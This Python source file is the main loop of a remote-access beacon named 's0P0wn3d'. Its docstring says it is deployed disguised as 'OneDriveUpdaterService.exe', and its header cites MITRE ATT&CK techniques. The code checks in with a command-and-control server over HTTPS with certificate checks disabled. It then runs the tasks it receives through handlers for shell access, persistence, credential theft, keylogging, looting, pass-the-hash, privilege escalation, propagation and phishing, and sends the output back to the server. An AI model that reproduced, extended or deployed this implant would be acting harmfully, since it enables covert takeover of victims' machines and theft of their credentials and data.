"""
s0P0wn3d beacon — main C2 loop running on the target.
T1071: Application Layer Protocol (HTTPS)
T1036.005: Masquerading — deployed as OneDriveUpdaterService.exe
"""
from __future__ import annotations

import ssl
import time
import uuid
import json
import urllib.request
from pathlib import Path

from modules import shell, persistence, creds, keylog, loot, crack, pth, privesc, propagate, phish, rdp, syscall

C2_HOST  = "https://192.168.56.112"
SLEEP    = 5          # beacon interval in seconds
JITTER   = 2          # ± seconds
AGENT_ID = str(uuid.getnode())  # MAC-based stable ID

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE  # self-signed cert

_HANDLERS: dict[str, callable] = {
    "shell":     shell.run,
    "persist":   persistence.run,
    "creds":     creds.run,
    "keylog":    keylog.run,
    "loot":      loot.run,
    "crack":     crack.run,
    "pth":       pth.run,
    "privesc":   privesc.run,
    "propagate": propagate.run,
    "phish":     phish.run,
    "rdp":       rdp.run,
    "syscall":   syscall.run,
}


def _post(endpoint: str, payload: dict) -> dict:
    body = json.dumps(payload).encode()
    req = urllib.request.Request(
        f"{C2_HOST}{endpoint}",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, context=_ctx, timeout=10) as resp:
        return json.loads(resp.read())


def _checkin() -> list[dict]:
    return _post("/beacon", {"id": AGENT_ID}).get("tasks", [])


def _send_result(task_id: str, output: str) -> None:
    _post("/result", {"id": AGENT_ID, "task_id": task_id, "output": output})


def _dispatch(task: dict) -> str:
    cmd = task.get("cmd", "")
    handler = _HANDLERS.get(cmd)
    if handler is None:
        return f"unknown command: {cmd}"
    try:
        return handler(task) or ""
    except Exception as exc:
        return f"error: {exc}"


def run() -> None:
    import random
    while True:
        try:
            tasks = _checkin()
            for task in tasks:
                output = _dispatch(task)
                _send_result(task.get("id", "?"), output)
        except Exception:
            pass
        time.sleep(SLEEP + random.uniform(-JITTER, JITTER))


if __name__ == "__main__":
    run()
